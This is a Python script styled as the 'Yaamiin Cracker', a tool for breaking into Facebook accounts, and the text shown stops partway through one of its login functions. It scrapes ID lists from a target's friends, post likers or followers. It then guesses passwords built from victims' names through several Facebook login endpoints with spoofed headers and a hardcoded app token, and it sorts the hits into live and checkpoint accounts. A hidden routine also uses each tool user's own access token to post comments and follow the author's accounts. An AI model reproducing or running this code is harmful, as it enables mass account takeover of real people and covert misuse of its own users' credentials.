#!/usr/bin/python3
#coding=utf-8

## Open Resource Code for Lu Ye's Study. If you want to recode, just recode but no brain :)

#Leave Your Footprint By Tag The Recorder's Name :)

######################################################
#                                                    #
# Recode? Mantal Studio                              #
#                                                    #
# The Important Bot Follow Is Not Replaced!          #
#                                                    #
# Created By Yaamiin.                                #
#                                                    #
# Tipe Python3                                       #
#                                                    #
# File Name: test1.py                                #
#                                                    #
# Github: https://www.github.com/Yaamiin             #
#                                                    #
######################################################


import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
from random import randint
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""
\33[0;37m__
\33[0;37m ░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
\33[0;37m ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
\33[0;37m ██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
\33[0;37m ██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
\33[0;37m╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
\33[0;37m ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
        \x1b[0;32m\/      \/      \/
        \x1b[0;32m[ \x1b[0;36mYaamiin \x1b[0;33mCracker \x1b[0;32m]
""")

ua="NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

ua2="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

freefacebook = "https://free.facebook.com" #Update Method!

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit(p+" ["+k+"•"+m+"•"+p+"] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

 
### Contact IG ####
def ige():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Open Instagram? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open Instagram...")
    os.system("xdg-open https://www.instagram.com/mantalstudio")
    input(p+" [BACK]")
    logs()   

### TAKE TOKEN ###
def kontolrecode():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Open Youtube? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtube.com/channel/xxxx")
    input(p+" [BACK]")
    logs()   

    
### LOGIN METHODE ###
def logs():
  os.system("clear")
  banner()
  print ("")
  print((p+" ["+k+"01"+p+"] Login Token"))
  print((p+" ["+k+"02"+p+"] Login Cookies"))
  print((p+" ["+k+"03"+p+"] Tonton Cara Ambil Cookie"))
  
  print((p+" ["+k+"04"+p+"] Contact Author"))
  print((p+" ["+k+"00"+p+"] Exit\n"))
  sek=input(p+" ["+k+"•"+m+"•"+p+"] Choose: ")
  if sek=="":
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    logs()
  elif sek=="1" or sek=="01":
    log_token()
  elif sek=="2" or sek=="02":
    gen()
  elif sek=="3" or sek=="03":
    kontolrecode()
  elif sek=="4" or sek=="04":
    ige()
  elif sek=="0" or sek=="00":
    exit()
  else:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    logs()

#### LOGIN TOKEN METHODD:)
# Don't Delete Later Error! If you don't believe, please delete:V

def log_token():
    os.system("clear")
    banner()
    toket = input(p+"\n ["+k+"•"+m+"•"+p+"] Token: ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((p+" ["+k+"•"+m+"•"+p+"] Login Succeed!"))
        jalan((p+" ["+k+"•"+m+"•"+p+"] Please Subscribe My Channel:)"))
        os.system('xdg-open https://youtube.com/channel/xxxxxxx')
        bot_follow()
        menu()
    except KeyError:
        print((p+"\n ["+k+"•"+m+"•"+p+"] Token Invalid"))
        #os.system("xdg-open https://youtu.be/xxxxxx")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(p+"\n ["+k+"•"+m+"•"+p+"]"+p+" Cookies: ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n * Cookie Invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((p+"\n ["+k+"•"+m+"•"+p+"] No Connection"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((p+"\n ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
        jalan((p+" ["+k+"•"+m+"•"+p+"] Please Subscribe My Channel :)"))
        #
        os.system('xdg-open https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ')
        bot_follow()
        menu()


komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Bjir BiiDev Femes Cuk Gua Ampe Mrinding", "Tumben Post Bang?", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])


kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?","moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang","tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
komen = komtwol
komendua = kazutora
post = "3909741969124574"
postdua = "4134869446611824"
def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((p+" ["+k+"•"+m+"•"+p+"] Token Invalid"))
		logs()
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komen +'&access_token=' + toket)
	requests.post('https://graph.facebook.com/' + postdua + '/comments/?message=' + komendua + '&acces_token'+toket)
	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Me
	requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # Izhar
#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
	menu()


### MAIN MENU ###

def menu():
    global ua
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["first_name"]
        ttl = a["birthday"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+k+"•"+m+"•"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((m+"\n ["+p+" Welcome User \033[1;32m"+nama+m+" ]"+p))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your ID      : \033[1;32m"+id))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your TTL     : \033[1;32m"+ttl))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;32m"+durasi))
    print((p+"\n ["+k+"01"+p+"]"+p+" Crack ID From Public/Friendlist"))
    print((p+" ["+k+"02"+p+"]"+p+" Crack ID From Likers Post"))
    print((p+" ["+k+"03"+p+"]"+p+" Crack ID From Followers"))
    print((p+" ["+k+"04"+p+"]"+p+" Crack Phone Number"))
    print((p+" ["+k+"05"+p+"]"+p+" Crack Email"))
    print((p+" ["+k+"06"+p+"]"+p+" Check Opsi Account Checkpoint [ error ]"))
    print((p+" ["+k+"99"+p+"]"+p+" Result Crack"))
    print((p+" ["+k+"00"+p+"]"+p+" Logout "))
    choose_menu()

def choose_menu():
	r=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose: ")
	if r=="":
		print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		publik()
	elif r=="2" or r=="02":
		likers()
	elif r=="3" or r=="03":
		follow()
	elif r=="4" or r=="04":
		random_numbers()
	elif r=="5" or r=="05":
		random_email()
	elif r=="6" or r=="06":
		cek_opsi()
	elif r=="99":
		ress()
	elif r=="0" or r=="00":
		try:
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+" ["+k+"•"+m+"•"+p+"] Error %s"%e))
	else:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Wrong Input"))
		menu()	

def pilihcrack(file):
  print("\n\033[0;91m [ \033[1;37mSelect Method Crack\033[1;31m ]\033[1;37m")
  print((p+" ["+k+"01"+p+"] Crack With Api.Facebook [ 11 Password ]"))
  print((p+" ["+k+"02"+p+"] Crack With Api.Facebook + TTL [ 6 Password ]"))
  print((p+" ["+k+"03"+p+"] Crack With Mbasic.Facebook [ 6 Password ]"))
  print((p+" ["+k+"04"+p+"] Crack With Mbasic.Facebook + [ 9 Password ] TTL"))
  print((p+" ["+k+"05"+p+"] Crack With Touch.Facebook [ 9 Password ]"))
  print((p+" ["+k+"06"+p+"] Crack With Touch.Facebook + TTL [ 11 Password ]"))
  print((p+" ["+k+"07"+p+"] Crack With M.Facebook [ 11 Password ]"))
  print((p+" ["+k+"08"+p+"] Crack With M.Facebook + TTL [ 6 Password ]"))
  print((p+" ["+k+"09"+p+"] Crack With Free.Facebook [ 6 Password ]"))
  print((p+" ["+k+"10"+p+"] Crack With Free.Facebook + TTL [ 9 Password ]"))
  print((p+" ["+k+"00"+p+"] Back To Menu "))
  krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
  if krah in[""]:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    tofbe(file)
  elif krah in["6","06"]:
    tofbettl(file)
  elif krah in["7","07"]:
    crekm(file)
  elif krah in["8","08"]:
    crekmttl(file)
  elif krah in["9","09"]:
    freefb(file)
  elif krah in["10"]:
    freefbttl(file)
  elif krah in["0","00"]:
    menu()
  else:
    print((p+" ["+k+"•"+m+"•"+p+"]  Fill In The Correct"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Type \'me\' Dump From Friendlist"))
		idt = input(p+" ["+k+"•"+m+"•"+p+"] User ID Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] ID Post Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

### Krek Nomer su! ###
def random_numbers():
  data = []
  print((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit"))
  kode=str(input(p+" ["+k+"•"+m+"•"+p+"] Example : 92037\n"+p+" ["+k+"•"+m+"•"+p+"] Input Number: "))
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(p+"\n [BACK]"+p)
  menu()

def random_email():
  data = []
  nama=input(p+" ["+k+"•"+m+"•"+p+"] Target Name : ")
  domain=input(p+" ["+k+"•"+m+"•"+p+"] Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+k+"•"+m+"•"+p+"] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  setpw=input(p+" ["+k+"•"+m+"•"+p+"] Set Password : ").split(',')
  print("\033[1;37m ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("\n\033[1;37m [BACK]")
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(user), str(pw)))
        break
  except: pass


### PASSWORD ###

def generate1(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            elif len(i)>=6:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            else:
                continue
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def generate2(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("sayang")
    _dapunta_.append("bangsat")
    _dapunta_.append("anjing")
    return _dapunta_
def generate3(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("memek")
    _dapunta_.append("kontol")
    _dapunta_.append("ngentot")
    _dapunta_.append("goblok")
    _dapunta_.append("anjing")
    _dapunta_.append("sayang")
    return _dapunta_
def generate4(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_

#Cek Apk
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
### MODULE CRACK ###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	global ua
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
